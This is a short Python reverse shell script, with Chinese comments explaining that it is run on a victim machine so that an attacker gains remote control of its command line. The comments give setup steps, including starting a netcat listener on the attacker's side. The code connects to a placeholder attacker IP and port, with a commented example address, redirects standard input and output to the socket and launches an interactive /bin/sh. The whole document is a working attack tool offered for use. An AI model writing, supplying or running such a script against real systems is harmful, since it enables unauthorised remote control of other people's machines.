# Reverse Shell script
# 用于在目标机器上执行后，向攻击者指定的 IP 和端口建立一个远程 Shell 连接，使攻击者可以远程控制受害者机器的命令行
# ATTACKING_IP PORT 攻击者的IP和端口
# FIRST SETUP 攻击者 RUN nc -lv port (macos)  nc -lvnp port (linux)
# SECOND SETUP  将此脚本在目标机器(被攻击机器)上运行

import socket, subprocess, os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((ATTACKING_IP, PORT))
# s.connect(("192.168.5.130", 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p=subprocess.call(["/bin/sh", "-i"])
